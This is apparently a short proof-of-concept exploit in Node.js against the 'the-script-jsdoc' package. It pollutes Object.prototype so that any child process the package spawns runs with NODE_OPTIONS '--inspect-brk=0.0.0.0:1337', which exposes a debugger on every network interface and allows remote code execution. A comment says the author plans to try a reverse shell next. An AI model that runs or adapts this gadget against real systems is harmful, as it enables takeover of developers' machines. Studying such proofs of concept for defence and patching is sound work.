const jsdoc = require('the-script-jsdoc')
 
async function tryExample () {
  await jsdoc(__dirname + '/my_project_dir')
}

Object.prototype.shell = 'node';
Object.prototype.env = { NODE_OPTIONS: '--inspect-brk=0.0.0.0:1337' };

// TODO: try a reverse shell on Linux
 
tryExample().catch(console.error)